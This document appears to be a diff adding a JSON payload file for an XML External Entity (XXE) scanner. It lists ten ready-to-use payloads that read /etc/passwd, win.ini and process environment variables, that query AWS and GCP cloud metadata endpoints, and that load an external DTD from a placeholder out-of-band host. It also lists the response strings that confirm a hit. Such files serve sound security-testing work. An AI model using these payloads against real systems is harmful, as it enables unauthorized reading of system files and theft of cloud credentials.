@@ -1,0 +1,82 @@
+{
+"meta": {
+"name": "XML External Entity Injection",
+"category": "XXE",
+"cwe": "CWE-611",
+"wasc": "WASC-43",
+"reference": "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+},
+
+"payloads": [
+
+{
+"label": "linux file read",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+},
+
+{
+"label": "windows file read",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>"
+},
+
+{
+"label": "proc environ",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>"
+},
+
+{
+"label": "aws metadata",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>"
+},
+
+{
+"label": "gcp metadata",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><root>&xxe;</root>"
+},
+
+{
+"label": "parameter entity",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]><root/>"
+},
+
+{
+"label": "php wrapper",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>"
+},
+
+{
+"label": "external dtd",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://OOB_HOST/evil.dtd\"><root/>"
+},
+
+{
+"label": "svg xxe",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>"
+},
+
+{
+"label": "soap xxe",
+"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope>&xxe;</soap:Envelope>"
+}
+
+],
+
+"indicators": [
+"root:x:0:0",
+"daemon:",
+"[fonts]",
+"instance-id",
+"metadata.google",
+"redis_version",
+"MemTotal",
+"processor"
+],
+
+"content_types": [
+"application/xml",
+"text/xml",
+"application/soap+xml",
+"application/xhtml+xml",
+"image/svg+xml"
+]
+}
